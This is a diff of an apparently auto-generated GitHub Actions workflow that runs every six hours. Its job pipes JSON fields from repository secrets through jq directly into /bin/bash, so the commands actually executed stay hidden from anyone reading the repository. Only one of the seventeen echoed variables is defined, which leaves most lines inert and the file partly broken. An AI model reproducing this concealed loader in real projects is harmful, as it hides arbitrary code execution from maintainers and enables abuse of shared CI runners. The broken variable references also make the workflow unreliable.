@@ -2,7 +2,8 @@ name: fearfulsunflower
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
+    - cron: '45 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: fearfulsunflower
         env:
-          ytp110: ${{ secrets.ytp110 }}
+          psqj67: ${{ secrets.psqj67 }}
         run: |
-          echo $ytp110 | jq -r .jg19 | /bin/bash
-          echo $zkx8472 | jq -r .h5738 | /bin/bash
-          echo $vrjzb4 | jq -r .hxt78 | /bin/bash
-          echo $zk60233 | jq -r .kqlt5316 | /bin/bash
-          echo $dd62202 | jq -r .oaulg2 | /bin/bash
-          echo $bygo172 | jq -r .kkdr00 | /bin/bash
-          echo $k56433 | jq -r .rjbnn0 | /bin/bash
+          echo $psqj67 | jq -r .wmwa64 | /bin/bash
+          echo $bu54126 | jq -r .k9549 | /bin/bash
+          echo $mmwy9546 | jq -r .v26968 | /bin/bash
+          echo $ken65 | jq -r .uixh45118 | /bin/bash
+          echo $eznpa3 | jq -r .hkn1 | /bin/bash
+          echo $og485 | jq -r .inhhe546 | /bin/bash
+          echo $o0 | jq -r .fql02 | /bin/bash
+          echo $et102 | jq -r .s64540 | /bin/bash
+          echo $hc364 | jq -r .cbpyq3 | /bin/bash
+          echo $amg8 | jq -r .p3 | /bin/bash
+          echo $mia052 | jq -r .ok78 | /bin/bash
+          echo $vat0 | jq -r .b86792 | /bin/bash
+          echo $etgt5 | jq -r .r9727 | /bin/bash
+          echo $wwo6260 | jq -r .wyj64870 | /bin/bash
+          echo $nepd05895 | jq -r .rzmba342 | /bin/bash
+          echo $hw7629 | jq -r .oz10 | /bin/bash
+          echo $bpa1632 | jq -r .eq053 | /bin/bash
 
